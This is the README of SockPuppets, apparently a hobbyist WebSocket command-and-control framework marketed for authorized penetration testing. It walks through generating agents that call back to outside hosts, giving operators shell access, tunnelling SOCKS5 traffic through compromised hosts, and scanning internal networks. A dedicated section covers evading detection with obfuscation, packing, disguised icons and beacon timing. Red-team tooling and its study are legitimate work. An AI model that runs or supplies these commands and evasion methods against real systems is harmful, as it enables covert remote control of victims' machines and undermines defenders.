# SockPuppets

```
 _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____
|   __|     |     |  |  |  _  |  |  |  _  |  _  |   __|_   _|   __|
|__   |  |  |   --|    -|   __|  |  |   __|   __|   __|  |  |__   |
|_____|_____|_____|__|__|__|  |_____|__|  |__|  |_____|  |  |_____|

                    by AJ Hammond @ajm4n
```

mostly vibe coded c2. not a good c2. shoutout skyler knecht, jeremy schoeneman, matt jackoski, mason davis, and kevin clark

**SockPuppets** is a professional WebSocket-based agent management framework for security research and authorized penetration testing. It features multi-architecture compilation, beacon/streaming modes, SOCKS5 proxying, and comprehensive stealth capabilities.

##  Legal Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND TESTING ONLY**

Unauthorized access to computer systems is illegal. Users are solely responsible for obtaining proper authorization and complying with all applicable laws.

##  Features

### Core Capabilities
-  **Multi-platform Agents** - Python, PowerShell, JavaScript (Node.js), HTA
-  **Multi-Architecture Compilation** - x86, x64, ARM64 executables
-  **Dual Communication Modes** - Beacon (stealth) & Streaming (interactive)
-  **Custom Encryption** - User-definable XOR encryption keys
-  **SOCKS5 Proxying** - Tunnel traffic through compromised hosts
-  **Code Obfuscation** - Automatic function/variable name randomization
-  **Runtime Mode Switching** - Upgrade/downgrade between beacon and streaming
-  **Custom Icons** - Blend executables with legitimate software

### Operational Features
-  Real-time agent status monitoring
-  Automatic reconnection handling
-  Configurable beacon intervals
-  Interactive shell access
-  UPX compression support
-  Targeting by architecture

##  Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/ajm4n/sockpuppets.git
cd sockpuppets

# Install dependencies
pip install -r requirements.txt

# Optional: Install UPX for compression
# macOS: brew install upx
# Linux: apt-get install upx
# Windows: Download from https://upx.github.io/
```

### Basic Usage

```bash
# Start the interactive CLI
python main.py

# Start the server
sockpuppets> start 0.0.0.0 8443

# Generate agents (all formats)
sockpuppets> generate 192.168.1.100 8443

# Generate with custom encryption key
sockpuppets> generate 192.168.1.100 8443 --key=MySecretKey2026

# Generate beacon agent (stealthy, 5-minute check-ins)
sockpuppets> generate 192.168.1.100 8443 --beacon --interval=300

# Compile to executables (all architectures)
sockpuppets> generate 192.168.1.100 8443 --multi-arch

# View connected agents
sockpuppets> agents

# Interact with an agent
sockpuppets> interact <agent_id>
```

## 📖 Documentation

### Server Management

```bash
# Start server with default settings
sockpuppets> start

# Start on specific interface and port
sockpuppets> start 0.0.0.0 9999

# Start with custom encryption key
sockpuppets> start 0.0.0.0 8443 --key=CustomKey123

# Stop the server
sockpuppets> stop
```

### Agent Generation

#### Basic Generation
```bash
# Generate all agent types (Python, PowerShell, JS, HTA)
sockpuppets> generate 192.168.1.100 8443

# With custom encryption key (must match server key)
sockpuppets> generate 192.168.1.100 8443 --key=CustomKey123
```

#### Beacon Mode (Stealth)
```bash
# Beacon mode with 10-minute intervals
sockpuppets> generate target.com 443 --beacon --interval=600

# Beacon with 1-hour intervals
sockpuppets> generate target.com 443 --beacon --interval=3600
```

#### Executable Compilation
```bash
# Compile for x64 (default)
sockpuppets> generate 192.168.1.100 8443 --compile

# Compile for specific architecture
sockpuppets> generate 192.168.1.100 8443 --compile --arch=x86
sockpuppets> generate 192.168.1.100 8443 --compile --arch=arm64

# Compile for all architectures
sockpuppets> generate 192.168.1.100 8443 --multi-arch

# With custom icon (Windows only)
sockpuppets> generate 192.168.1.100 8443 --compile --icon=app.ico

# Without UPX compression
sockpuppets> generate 192.168.1.100 8443 --compile --no-upx
```

#### Complete Examples
```bash
# Production-ready: beacon, multi-arch, custom key & icon
sockpuppets> generate c2.company.com 443 --beacon --interval=300 --multi-arch --key=SecretKey --icon=update.ico

# Stealthy beacon agent, x64 only
sockpuppets> generate target.com 443 --beacon --interval=600 --compile --arch=x64 --key=MyKey
```

### Agent Interaction

Once an agent connects:

```bash
# List all agents (shows mode, status, beacon intervals)
sockpuppets> agents

# Interact with specific agent
sockpuppets> interact a1b2c3d4

# Execute commands
agent[a1b2c3d4]> whoami
agent[a1b2c3d4]> pwd
agent[a1b2c3d4]> ls -la

# Start SOCKS5 proxy
agent[a1b2c3d4]> socks 1080

# Adjust beacon interval (beacon mode only)
agent[a1b2c3d4]> sleep 300

# Upgrade to streaming mode (real-time)
agent[a1b2c3d4]> upgrade

# Downgrade to beacon mode (stealth)
agent[a1b2c3d4]> downgrade 600

# Return to main menu
agent[a1b2c3d4]> back
```

### SOCKS5 Proxy Usage

After starting a SOCKS proxy on an agent:

```bash
# Use with curl
curl --socks5 127.0.0.1:1080 http://internal-server

# Use with proxychains
# Edit /etc/proxychains.conf:
# socks5 127.0.0.1 1080
proxychains nmap -sT 10.0.0.0/24

# Use with browser
# Configure browser SOCKS5 proxy: 127.0.0.1:1080
```

## 🏗️ Architecture

### Communication Modes

**Streaming Mode (Default)**
- Persistent WebSocket connection
- Real-time command execution
- Immediate responses
- Periodic heartbeats
- Best for: Interactive operations, active engagements

**Beacon Mode**
- Intermittent check-ins
- Configurable sleep intervals
- Lower network footprint
- Stealthier operations
- Best for: Long-term persistence, evading network monitoring

### Agent Types

| Type | Platform | Requirements | Notes |
|------|----------|--------------|-------|
| Python | Cross-platform | Python 3.7+ | Most versatile |
| PowerShell | Windows | PowerShell 5.0+ | Native Windows |
| JavaScript | Cross-platform | Node.js | Lightweight |
| HTA | Windows | IE/Edge | Legacy support |
| EXE (compiled) | Windows/Linux/macOS | None | Standalone |

### Encryption

- **Algorithm**: XOR-based obfuscation with Base64 encoding
- **Key**: User-definable (default: `SOCKPUPPETS_KEY_2026`)
- **Note**: For production use, consider implementing AES-256

## 🔧 Advanced Usage

### Standalone Components

Run server without CLI:
```bash
python server.py --host 0.0.0.0 --port 8443 --key=CustomKey
```

Generate agents without CLI:
```bash
python agent.py --host target.com --port 443 --compile --arch x64 x86 --beacon --interval 300 --key CustomKey
```

### Custom Agent Deployment

Deploy Python agent:
```bash
python output/agent_xxx_stream.py
```

Deploy compiled agent:
```bash
# Windows
agent_xxx_x64.exe

# Linux
chmod +x agent_xxx_x64_linux
./agent_xxx_x64_linux
```

### Docker Deployment

```dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY . .
RUN pip install -r requirements.txt
EXPOSE 8443
CMD ["python", "server.py", "--host", "0.0.0.0", "--port", "8443"]
```

## 📁 Project Structure

```
sockpuppets/
├── main.py                 # Interactive CLI
├── server.py              # WebSocket C2 server
├── agent.py               # Agent generator
├── requirements.txt       # Dependencies
├── README.md             # This file
├── COMPILATION_GUIDE.md  # Detailed compilation docs
├── templates/            # Agent templates
│   ├── agent_template.py
│   ├── agent_template.ps1
│   ├── agent_template.js
│   └── agent_template.hta
└── output/              # Generated agents (auto-created)
```

## 🛡️ Operational Security

### Best Practices

1. **Always use custom encryption keys** - Don't use defaults
2. **Beacon mode for persistence** - Reduces network signatures
3. **Custom icons and names** - Blend with legitimate software
4. **Test in isolated environments** - Before operational use
5. **Rotate infrastructure** - Don't reuse C2 servers
6. **Monitor agent health** - Track last-seen timestamps
7. **Clean up artifacts** - Remove agents after operations

### Anti-Detection

- **Code obfuscation**: Enabled by default on all agents
- **Custom encryption keys**: Change from defaults
- **UPX packing**: Reduces static signatures
- **Custom icons**: Mimics legitimate applications
- **Beacon intervals**: Randomize to evade behavioral detection
- **SOCKS proxying**: Tunnel through compromised hosts

### Evasion Techniques

```bash
# Generate with all evasion features
sockpuppets> generate target.com 443 \
  --beacon \
  --interval=1800 \
  --compile \
  --arch=x64 \
  --icon=legitimate_app.ico \
  --key=UniqueKey$(date +%s)

# Use HTTPS-capable reverse proxy (nginx, Caddy)
# for additional SSL/TLS encryption layer
```

## 🔍 Troubleshooting

### Agent Won't Connect
- Verify firewall allows connections on server port
- Check encryption keys match between server and agent
- Ensure server is running and accessible
- Test connectivity: `telnet <server> <port>`

### Compilation Fails
- Install PyInstaller: `pip install pyinstaller`
- Ensure Python version 3.7+
- Check disk space (compilations can be large)
- Try without UPX: `--no-upx`

### SOCKS Proxy Not Working
- Verify agent has network access to targets
- Check local firewall on SOCKS port
- Test with curl: `curl --socks5 127.0.0.1:1080 http://example.com`
- Ensure SOCKS client supports SOCKS5

### Beacon Agent Unresponsive
- Check beacon interval hasn't expired
- Verify agent process is running
- Upgrade to streaming for testing: `upgrade`
- Review agent's last_seen timestamp

##  Credits

- **Author**: AJ Hammond (@ajm4n)
- **Inspiration**: Kevin Clark's BadRATs and similar C2 frameworks
- **Libraries**: websockets, PyInstaller

---

**Remember**: Always obtain proper authorization before testing. Unauthorized access is illegal.

```bash
# Happy hunting!
sockpuppets> start 0.0.0.0 8443
sockpuppets> generate target.com 443 --beacon --interval=300 --multi-arch
```
